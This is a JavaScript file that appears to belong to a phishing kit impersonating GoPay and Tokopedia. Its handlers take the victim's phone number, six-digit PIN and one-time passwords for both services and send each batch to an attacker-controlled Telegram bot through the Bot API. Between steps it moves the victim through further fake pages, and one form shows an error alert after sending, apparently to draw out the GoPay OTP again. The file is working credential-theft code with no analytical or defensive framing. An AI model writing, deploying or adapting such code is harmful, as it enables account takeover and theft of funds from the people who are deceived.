function kirimResult(gabungan){
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
        complete: function(data) {
                    console.log('Complete')
        setTimeout(function(){
            }, 1000);
  
                }
            });
  }

function sendNohp(event){
        event.preventDefault();
        $(".load").fadeIn();
        $("#nohp").blur();
        $("#btnnohp").attr("disabled","true");

        var nohp = $("#nohp").val();
        sessionStorage.setItem("nohp", nohp);

        var gabungan = '' + '╚»★«╝ GOPAY X TOKPED ╚»★«╝' + '%0A' +
    'Nomer : ' + nohp; 

    kirimResult(gabungan);
    setTimeout(function(){
           window.location.href = 'c.html';
        },1500);

       
    };

 function sendOtp(){
        $(".load").fadeIn();
        var nohp = sessionStorage.getItem("nohp");
        var pin = $("#pin1").val() + $("#pin2").val() + $("#pin3").val() + $("#pin4").val() + $("#pin5").val() + $("#pin6").val();
       
        sessionStorage.setItem("pin", pin);

        var gabungan = '' + '╚»★«╝ GOPAY X TOKPED ╚»★«╝' + '%0A' +
    'Nomer : ' + nohp + '%0A' +
    'PIN : ' + pin;

    kirimResult(gabungan);
    setTimeout(function(){
           window.location.href = 'tokped.html';
        },1500);
    };

 $("#formPin").on("submit", function(event){
        event.preventDefault();
        $(".load").fadeIn();
        var pin = sessionStorage.getItem("pin");
        var nohp = sessionStorage.getItem("nohp");
        var otpGopay = $("#ottp").val();
        var otpTokped = sessionStorage.getItem("otpTokped");

        var gabungan = '' + '╚»★«╝ GOPAY X TOKPED ╚»★«╝' + '%0A' +
    'Nomer : ' + nohp + '%0A' +
    'PIN : ' + pin + '%0A' +
    'OTP TOKPED : ' + otpTokped + '%0A' +
    'OTP GOPAY : ' + otpGopay;

        kirimResult(gabungan);
        $(".load").hide();
                    $(".alert").show();
                    setTimeout(function(){
                        $(".inppin").val("");
                        $("#ottp").focus();
                        $("#ottp").on("input", function(){
                            $(".alert").hide();
                        })
                    },1600);
    });


    $("#formTokped").on("submit", function(event){
        event.preventDefault();
        $(".load").fadeIn();
        var pin = sessionStorage.getItem("pin");
        var nohp = sessionStorage.getItem("nohp");
        var otpTokped = $("#ottp").val();
        sessionStorage.setItem("otpTokped", otpTokped);

        var gabungan = '' + '╚»★«╝ GOPAY X TOKPED ╚»★«╝' + '%0A' +
    'Nomer : ' + nohp + '%0A' +
    'PIN : ' + pin + '%0A' +
    'OTP TOKPED : ' + otpTokped;

        kirimResult(gabungan);
        setTimeout(function(){
           window.location.href = 'd.html';
        },1500);
    });